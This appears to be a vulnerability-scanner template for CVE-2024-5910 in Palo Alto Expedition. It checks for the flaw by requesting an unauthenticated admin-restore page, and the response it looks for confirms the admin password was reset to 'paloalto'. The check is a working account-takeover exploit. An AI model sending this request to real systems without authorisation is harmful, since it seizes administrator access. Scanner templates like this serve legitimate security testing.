id: CVE-2024-5910

info:
  name: Unauthorized Admin Restore Page
  author: johnk3r
  severity: critical
  reference:
    - https://www.horizon3.ai/attack-research/palo-alto-expedition-from-n-day-to-full-compromise
  description: "CVE-2024-5910 Expedition: Missing Authentication Leads to Admin Account Takeover"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/OS/startup/restore/restoreAdmin.php"

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        words:
          - "Connected successfully to the database"
          - "Admin user found"
          - "Admin password restored to: 'paloalto'"

      - type: word
        part: header
        words:
          - "Apache/2.4.41"
          - "Ubuntu"
